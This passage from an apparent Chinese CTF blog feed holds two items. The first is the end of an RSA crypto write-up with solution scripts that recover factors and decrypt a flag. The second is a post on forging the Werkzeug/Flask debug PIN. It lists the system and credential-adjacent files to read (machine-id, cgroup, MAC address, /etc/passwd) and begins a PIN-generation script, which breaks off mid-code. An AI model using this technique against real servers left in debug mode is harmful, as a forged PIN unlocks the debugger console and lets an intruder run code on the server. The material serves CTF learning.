mtight">2323</span><span class="mbin mtight">×</span><span class="mord mtight">2424</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2023</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2024</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">2</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2323</span><span class="mbin mtight">×</span><span class="mord mtight">2424</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord">2</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2024</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2023</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">2</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2424</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord">2</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2024</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord">2</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2424</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2023</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">2</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2424</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord">2</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">h</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8641em;"></span><span class="mord">202</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2424</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2024</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2024</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord">2</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2424</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2023</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2024</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">2</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2424</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord">2</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">式</span><span class="mord">②</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord">202</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2424</span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2323</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2024</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2024</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord">2</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2323</span><span class="mbin mtight">×</span><span class="mord mtight">2424</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2023</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2024</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">2</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2323</span><span class="mbin mtight">×</span><span class="mord mtight">2424</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord">2</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord cjk_fallback">最后将式</span><span class="mord">②</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">式</span><span class="mord">①</span><span class="mord cjk_fallback">得</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord">202</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2424</span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2323</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord">202</span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2323</span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2424</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord">2</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord">2</span></span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">n2 = <span class="number">0x3CC006E0DEA07F834418109AC8C1A447258C7DA01223107FD255303613CE9FFC3FAA74823A28EA1E211A34C349F20B49BB00447777E4D7F5139219E62FB993562F7E705E0919CCBC414956E8A6CC3E01812CA6EB10558060FE0F7C06DA63E5D6169EA5790E86F3E2E804D399D1429529D3031738F134E619A0DECCE12BDE4CD</span></span><br><span class="line">c2 = <span class="number">0x2DE5D5191BF279BA3EA338BD4390A18D0233DA9E050B3AA2644A9427EFF787B4D74AA3C7DC348F214247997AE32FB86428935E61234F9EF63E9B562C40B6B07C9133CAD4672C9AA7F515D3F7D067B6187D30E4346C4AFECEAE031C3116CCF97ACADDB2AF42D459C61CE0DF7B56CE1E0BA15CF28AED5415615AA9398FB494E5B</span></span><br><span class="line">hint2 = <span class="number">0x2DD30B086F1C8FA7860ED5CDE1E02A062E8722AE9823579F764D5DA86EC250B2DFEE6934463A06B133D791C3CFBE5F88A43BFAE7F25CFB3EFB61C10AA710AA76E2229241986FB16F1AE34A867CB7BA641D5637B70A92027479E9C18D1372059A4E04A7298C5B279FA6D84ABC1B466B29BBA8A1A2EA9E8AD568C14AF17C4F50E</span></span><br><span class="line">hint3 = <span class="number">0x35751402DE3CB0F6481451A7B3665B3DDD15C9F0AD07398C4EE35C01FF926DD2545DC41D591FCA58B485E3CD114D7C0A67196F95FCEBC9391F10C89DED2B1EF3E5014AB8FE5EA33E2AFB1CD9AF7D84FCA17E56E759B136578C29F679A64F0E2060492EEE268AF2304F7C689ECE60A941BA8100DD0D2AF1A45499AFD10CF9EAA</span></span><br><span class="line">A = <span class="built_in">pow</span>(<span class="built_in">pow</span>(<span class="number">2024</span>, <span class="number">2424</span>, n2) * hint3, <span class="number">2323</span>, n2)</span><br><span class="line">B = <span class="built_in">pow</span>(<span class="built_in">pow</span>(<span class="number">2023</span>, <span class="number">2323</span>, n2) * hint2, <span class="number">2424</span>, n2)</span><br><span class="line">p2 = gmpy2.gcd(A - B, n2)</span><br><span class="line"><span class="built_in">print</span>(p2)</span><br><span class="line">q2 = n2 // p2</span><br><span class="line"><span class="keyword">assert</span> p2 * q2 == n2</span><br><span class="line">phi2 = (p2 - <span class="number">1</span>) * (q2 - <span class="number">1</span>)</span><br><span class="line">e2 = <span class="number">44021</span></span><br><span class="line">d2 = inverse(e2, phi2)</span><br><span class="line">q = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>, q)</span><br><span class="line"><span class="keyword">assert</span> isPrime(q)</span><br></pre></td></tr></table></figure><p>合起来解RSA拿到flag</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># sage</span></span><br><span class="line"><span class="string">a = 0xC028AF32E59098F182059E09D4463C34A71B5DB98D0D538305102CE68CDA72F6897606FD8D933B51633E63C63BE59CC3454E8D04D287EDA3535F21A8C9496F9E5B62EDC81EB971D55B9ECC20B4D6671709E73AF110D1BEF9413E9786032D268FD7D243D01CCBDBEB0757E5A5AFFBC976E83F85BDE685618D592FE23D754919A2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def r(h, g, N, p, qi):</span></span><br><span class="line"><span class="string">    # N : p-1</span></span><br><span class="line"><span class="string">    # qi: N中的素因子</span></span><br><span class="line"><span class="string">    Zp = Zmod(p)</span></span><br><span class="line"><span class="string">    h = pow(h, N // qi, p)</span></span><br><span class="line"><span class="string">    g = pow(g, N // qi, p)</span></span><br><span class="line"><span class="string">    ri = discrete_log(Zp(h), Zp(g))</span></span><br><span class="line"><span class="string">    return int(ri)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># a = base ^ x (mod myord)</span></span><br><span class="line"><span class="string">base = 96436963965527068665018503742725174677</span></span><br><span class="line"><span class="string">myord = 1756732319378271983655460958536265633132714124613745489204050716607593076120290066696183637688559620200527260763663370378413505765181372017758141178797150102620052790909049114335428548638439804985346548923394837529069398274110266205521499271733197384646112456211369819887858630437075169226364135089414464738863</span></span><br><span class="line"><span class="string">factors = [</span></span><br><span class="line"><span class="string">    10529,</span></span><br><span class="line"><span class="string">    65777,</span></span><br><span class="line"><span class="string">    344417,</span></span><br><span class="line"><span class="string">    503777,</span></span><br><span class="line"><span class="string">    549247,</span></span><br><span class="line"><span class="string">    730447,</span></span><br><span class="line"><span class="string">    859927,</span></span><br><span class="line"><span class="string">    860113,</span></span><br><span class="line"><span class="string">    927233,</span></span><br><span class="line"><span class="string">    1034233,</span></span><br><span class="line"><span class="string">]  # myord-1=2 * 10529 * 65777^2 * 344417 * 503777 * 549247^4 * 730447^3 * 859927^2 * 860113^3 * 927233^5 * 1034233^5 * 8210213835010098187641073710320295311398472587668756884856051781525126902256646181559044298514514409082539533321235574592460391649123614566600595458616129</span></span><br><span class="line"><span class="string">r_list = []</span></span><br><span class="line"><span class="string">for qi in factors:</span></span><br><span class="line"><span class="string">    tmp = r(a, base, myord - 1, myord, qi)</span></span><br><span class="line"><span class="string">    r_list.append(tmp)</span></span><br><span class="line"><span class="string">x = crt(r_list, factors)</span></span><br><span class="line"><span class="string">module = 1</span></span><br><span class="line"><span class="string">for i in factors:</span></span><br><span class="line"><span class="string">    module *= i</span></span><br><span class="line"><span class="string">while True:</span></span><br><span class="line"><span class="string">    if int(pow(base, x, myord)) == a:</span></span><br><span class="line"><span class="string">        print(&quot;e =&quot;, x)</span></span><br><span class="line"><span class="string">        break</span></span><br><span class="line"><span class="string">    x += module</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">3035716141</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">0x11DF715605906C9CFC906FAF4D02A380B9489FE890952CFBC7713AF87031B61A4A3A0E2C46BA89EF462A3A77DEF7D5DE0A0A10B3D1303AFC06ED7BC9F07E01E9883B06CE17C290FE550844CF9028F50642E4190CCB13CDF0BB0493E437C54EE17643202CC1B35741208957EB6C1843299B4480E6D32A311DE6FD6F4B9D9E8FAB</span></span><br><span class="line">c1 = <span class="number">0x5A768E8E3E4EFE51F566D77DD9A1312F5398BC9E1FA4E828BE6A3B6AA6109DE02C4EEC524E23BF0836B7B25F534A429744E980BDC3ACD77A8133C543EA1CF4F4665FBD46BC21D38EDD60A687007E079980CAC97E1099610AECEEE3BFF13483396A4CFB061DF7D5BCE9C7FBA6AE14FBEAD5F56AA990F23EE9CBE8A8FC066D5FA</span></span><br><span class="line">hint1 = <span class="number">0xC3FD84BEEB2363D414848FDA5898976625BCBB9637982F83853A6C96E64C8EC94645409B7036E3B187ECF930E294FC448C4AC6BFA9945078300B1619BC98D13275770F562874C7FD389BA9EF4E05019633566E65BA95E5A30E29A45B79774C6AAED89AA43105508E868941C81861120F50FE182E33B80701E1714205759F380</span></span><br><span class="line">b = <span class="number">2024</span></span><br><span class="line">p1 = gmpy2.gcd(<span class="built_in">pow</span>(b, n1, n1) - hint1, n1)</span><br><span class="line">q1 = n1 // p1</span><br><span class="line"><span class="keyword">assert</span> p1 * q1 == n1</span><br><span class="line">phi1 = (p1 - <span class="number">1</span>) * (q1 - <span class="number">1</span>)</span><br><span class="line">e1 = <span class="number">39847</span></span><br><span class="line">d1 = inverse(e1, phi1)</span><br><span class="line">p = <span class="built_in">pow</span>(c1, d1, n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>, p)</span><br><span class="line"><span class="keyword">assert</span> isPrime(p)</span><br><span class="line">n2 = <span class="number">0x3CC006E0DEA07F834418109AC8C1A447258C7DA01223107FD255303613CE9FFC3FAA74823A28EA1E211A34C349F20B49BB00447777E4D7F5139219E62FB993562F7E705E0919CCBC414956E8A6CC3E01812CA6EB10558060FE0F7C06DA63E5D6169EA5790E86F3E2E804D399D1429529D3031738F134E619A0DECCE12BDE4CD</span></span><br><span class="line">c2 = <span class="number">0x2DE5D5191BF279BA3EA338BD4390A18D0233DA9E050B3AA2644A9427EFF787B4D74AA3C7DC348F214247997AE32FB86428935E61234F9EF63E9B562C40B6B07C9133CAD4672C9AA7F515D3F7D067B6187D30E4346C4AFECEAE031C3116CCF97ACADDB2AF42D459C61CE0DF7B56CE1E0BA15CF28AED5415615AA9398FB494E5B</span></span><br><span class="line">hint2 = <span class="number">0x2DD30B086F1C8FA7860ED5CDE1E02A062E8722AE9823579F764D5DA86EC250B2DFEE6934463A06B133D791C3CFBE5F88A43BFAE7F25CFB3EFB61C10AA710AA76E2229241986FB16F1AE34A867CB7BA641D5637B70A92027479E9C18D1372059A4E04A7298C5B279FA6D84ABC1B466B29BBA8A1A2EA9E8AD568C14AF17C4F50E</span></span><br><span class="line">hint3 = <span class="number">0x35751402DE3CB0F6481451A7B3665B3DDD15C9F0AD07398C4EE35C01FF926DD2545DC41D591FCA58B485E3CD114D7C0A67196F95FCEBC9391F10C89DED2B1EF3E5014AB8FE5EA33E2AFB1CD9AF7D84FCA17E56E759B136578C29F679A64F0E2060492EEE268AF2304F7C689ECE60A941BA8100DD0D2AF1A45499AFD10CF9EAA</span></span><br><span class="line">A = <span class="built_in">pow</span>(<span class="built_in">pow</span>(<span class="number">2024</span>, <span class="number">2424</span>, n2) * hint3, <span class="number">2323</span>, n2)</span><br><span class="line">B = <span class="built_in">pow</span>(<span class="built_in">pow</span>(<span class="number">2023</span>, <span class="number">2323</span>, n2) * hint2, <span class="number">2424</span>, n2)</span><br><span class="line">p2 = gmpy2.gcd(A - B, n2)</span><br><span class="line"><span class="built_in">print</span>(p2)</span><br><span class="line">q2 = n2 // p2</span><br><span class="line"><span class="keyword">assert</span> p2 * q2 == n2</span><br><span class="line">phi2 = (p2 - <span class="number">1</span>) * (q2 - <span class="number">1</span>)</span><br><span class="line">e2 = <span class="number">44021</span></span><br><span class="line">d2 = inverse(e2, phi2)</span><br><span class="line">q = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>, q)</span><br><span class="line"><span class="keyword">assert</span> isPrime(q)</span><br><span class="line">c = <span class="number">0x639CD472630AFB1AA9F5490B4F3DE3B4701EEF5C61AAD06345F9E001021340CF989FC082693F745716BD39D015793E62BE08913DCB82B2B6C8ED56D15A4CC230A60EA185D593A858B47276C403C79B6DA23B561B200295A8ADDBA7A48660D17A9EEF322E430B939AECC4CA0C0F4FCC003524CDCA68B7BE935962F4B4AD8CAFD5</span></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python中werkzeug有关PIN值的构造</title>
      <link href="/posts/fc0a87bd.html"/>
      <url>/posts/fc0a87bd.html</url>
      
        <content type="html"><![CDATA[<p>参考自<a href="https://blog.hz2016.com/2023/07/flask%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8Fpin%E5%80%BC%E8%AE%A1%E7%AE%97%E5%92%8C%E5%88%A9%E7%94%A8/">https://blog.hz2016.com/2023/07/flask调试模式pin值计算和利用/</a></p><h1 id="需要知道的文件名一览">需要知道的文件名一览</h1><h2 id="用户名">用户名</h2><p>通过/etc/passwd猜测，一般是root。如果有用户目录设在/app大概率是那个用户名</p><h2 id="源码地址">源码地址</h2><p>通过报错得到</p><h2 id="网络地址">网络地址</h2><pre><code>/sys/class/net/eth0/address/sys/class/net/ens33/address</code></pre><p>需要转十进制（后面有脚本）</p><h2 id="机器ID">机器ID</h2><pre><code>1. /etc/machine-id（一般仅非docker机有，截取全文）2. /proc/sys/kernel/random/boot_id（一般仅非docker机有，截取全文）3. /proc/self/cgroup（一般仅docker有，仅截取最后一个斜杠后面的内容）优先选择1，没有1选2，只能选1，2中的一个。3有没有不影响，有就要连接在1或2的后面。(1 or 2) (+3)</code></pre><h1 id="脚本">脚本</h1><h2 id="算地址（可以内置进下面的版本计算）">算地址（可以内置进下面的版本计算）</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">address = <span class="string">&quot;02:0a:27:03:12:57&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(address.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>), <span class="number">16</span>))</span><br></pre></td></tr></table></figure><h2 id="低版本-werkzeug-2-0-x-md5">低版本(werkzeug&lt;2.0.x md5)</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># MD5</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&quot;flaskweb&quot;</span>  <span class="comment"># username</span></span><br><span class="line">    <span class="string">&quot;flask.app&quot;</span>,  <span class="comment"># modname</span></span><br><span class="line">    <span class="string">&quot;Flask&quot;</span>,  <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&quot;/usr/local/lib/python3.7/site-packages/flask/app.py&quot;</span>,  <span 